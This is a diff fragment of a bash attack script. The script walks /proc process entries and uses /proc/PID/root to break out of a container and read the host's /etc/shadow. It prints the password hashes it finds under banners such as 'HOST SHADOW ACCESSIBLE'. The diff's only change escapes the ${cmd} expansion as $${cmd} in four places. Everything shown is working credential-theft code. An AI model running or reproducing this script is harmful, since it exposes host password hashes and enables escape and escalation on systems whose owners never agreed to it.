@@ -56,7 +56,7 @@ for pid in /proc/[0-9]*; do
             # Show what process this is
             if [ -r "$pid/cmdline" ]; then
                 cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
-                echo "    Process: ${cmd:-[kernel thread]}"
+                echo "    Process: $${cmd:-[kernel thread]}"
             fi
         fi
     fi
@@ -165,7 +165,7 @@ for pid in /proc/[0-9]*; do
             echo "[*] Process PID: $pid_num"
             if [ -r "$pid/cmdline" ]; then
                 cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
-                echo "[*] Process: ${cmd:-[kernel thread]}"
+                echo "[*] Process: $${cmd:-[kernel thread]}"
             fi
             echo "[*] Password hashes:"
             head -3 "$shadow_path"
@@ -277,7 +277,7 @@ for pid in /proc/[0-9]*; do
             echo "[+] 🚨🚨🚨 HOST SHADOW ACCESSIBLE VIA PID $pid_num!"
             if [ -r "$pid/cmdline" ]; then
                 cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
-                echo "[*] Process: ${cmd:-[kernel thread]}"
+                echo "[*] Process: $${cmd:-[kernel thread]}"
             fi
             echo "[*] Host password hashes via PID $pid_num:"
             head -3 "$pid/root/etc/shadow"
@@ -334,7 +334,7 @@ for pid in /proc/[0-9]*; do
             echo "[+] 🚨🚨🚨 SUCCESS: Shadow accessible via PID $pid_num!"
             if [ -r "$pid/cmdline" ]; then
                 cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
-                echo "[*] Process: ${cmd:-[kernel thread]}"
+                echo "[*] Process: $${cmd:-[kernel thread]}"
             fi
             echo "[*] PASSWORD HASHES VIA PID $pid_num:"
             cat "$pid/root/etc/shadow"
